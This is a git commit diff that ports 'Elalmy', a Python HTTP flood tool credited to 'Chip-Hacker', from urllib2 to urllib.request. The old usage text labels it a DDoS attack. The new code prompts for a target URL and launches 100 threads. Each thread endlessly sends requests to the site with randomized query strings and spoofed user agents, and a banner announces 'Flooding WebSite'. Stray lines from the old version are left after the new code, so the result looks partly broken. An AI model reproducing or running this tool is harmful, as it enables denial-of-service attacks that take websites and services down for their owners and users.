5ebe96ef35733195710f7d3ffe8a54cae6739405
Mohammedzv <mf9391224@gmail.com>
2026-06-19 21:21:50 +0300

    Update urllib2 to urllib.request and fix indentation

--- Elalmy.py
+++ Elalmy.py
@@ -1,72 +1,86 @@
-import urllib2
+import urllib.request
 import sys
 import threading
 import random
 import re
 
-#global params
-url=''
-host=''
-headers_useragents=[]
-headers_referers=[]
-request_counter=0
-flag=0
-safe=0
+# المتغيرات العالمية كما كانت في ملفك الأصلي
+url = ''
+host = ''
+headers_useragents = []
+headers_referers = []
+request_counter = 0
+flag = 0
+safe = 0
 
 def inc_counter():
-	global request_counter
-	request_counter+=1
+    global request_counter
+    request_counter += 1
 
 def set_flag(val):
-	global flag
-	flag=val
+    global flag
+    flag = val
 
 def set_safe():
-	global safe
-	safe=1
-	
-# generates a user agent array
+    global safe
+    safe = 1
+    
+# قائمة المتصفحات
 def useragent_list():
-	global headers_useragents
-	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
-	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
-	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
-	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
-	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
-	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
-	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
-	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
-	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
-	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
-	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
-	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
-	return(headers_useragents)
+    global headers_useragents
+    headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
+    headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3')
+    return(headers_useragents)
 
-# generates a referer array
+# قائمة الـ Referers
 def referer_list():
-	global headers_referers
-	headers_referers.append('http://www.google.com/?q=')
-	headers_referers.append('http://www.usatoday.com/search/results?q=')
-	headers_referers.append('http://engadget.search.aol.com/search?q=')
-	headers_referers.append('http://' + host + '/')
-	return(headers_referers)
-	
-#builds random ascii string
+    global headers_referers
+    headers_referers.append('http://www.google.com/?q=')
+    headers_referers.append('http://' + host + '/')
+    return(headers_referers)
+    
+# بناء نص عشوائي
 def buildblock(size):
-	out_str = ''
-	for i in range(0, size):
-		a = random.randint(65, 90)
-		out_str += chr(a)
-	return(out_str)
+    out_str = ''
+    for i in range(0, size):
+        a = random.randint(65, 90)
+        out_str += chr(a)
+    return(out_str)
 
-def usage():
-	print '(-------------------------Elalmy--------------------------)'
-	print 'USAGE: python httpdoser.py <url>'
-	print 'httpdoser website : DDoS Attack'
-	print "\a"
-print \
-"""
-                   ...
+def httpcall(url):
+    useragent_list()
+    referer_list()
+    if url.count("?") > 0:
+        param_joiner = "&"
+    else:
+        param_joiner = "?"
+    
+    request = urllib.request.Request(url + param_joiner + buildblock(random.randint(3,10)))
+    request.add_header('User-Agent', random.choice(headers_useragents))
+    request.add_header('Host', host)
+    
+    try:
+        urllib.request.urlopen(request)
+        inc_counter()
+    except Exception:
+        pass
+
+class HTTPThread(threading.Thread):
+    def run(self):
+        while flag < 2:
+            httpcall(url)
+
+class MonitorThread(threading.Thread):
+    def run(self):
+        previous = request_counter
+        while flag == 0:
+            if (previous + 100 < request_counter):
+                print(str(request_counter) + " Requests Sent")
+                previous = request_counter
+
+# التصميم والشكل المطلوب
+print("""
+                                      ...
                  ;::::;   Elalmy Starting...
                ;::::; :;    By  Chip-Hacker
              ;:::::'   :;
@@ -87,28 +101,24 @@ print \
      `:::::`::::::::::::;'`:;::#                O
       `:::::`::::::::;' /  / `:#
        ::::::`:::::;'  /  /   `#
-	 
-	  
-                                          
-"""
-print '(------------------------Elalmy---------------------------)'
+""")
+print('(------------------------Elalmy---------------------------)')
 
-	
-#http request
-def httpcall(url):
-	useragent_list()
-	referer_list()
-	code=0
-	if url.count("?")>0:
-		param_joiner="&"
-	else:
-		param_joiner="?"
-	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
-	request.add_header('User-Agent', random.choice(headers_useragents))
-	request.add_header('Cache-Control', 'no-cache')
-	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
-	request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(5,10)))
-	request.add_header('Keep-Alive', random.randint(110,120))
+# طلب الرابط من المستخدم
+target = input("Enter Target URL: ")
+if not target.startswith("http"):
+    target = "http://" + target
+url = target
+
+m = re.search('http\://([^/]*)/?.*', url)
+host = m.group(1)
+
+print("Flooding WebSite: " + host)
+for i in range(100):
+    t = HTTPThread()
+    t.start()
+t = MonitorThread()
+t.start()
 	request.add_header('Connection', 'keep-alive')
 	request.add_header('Host',host)
 	try:
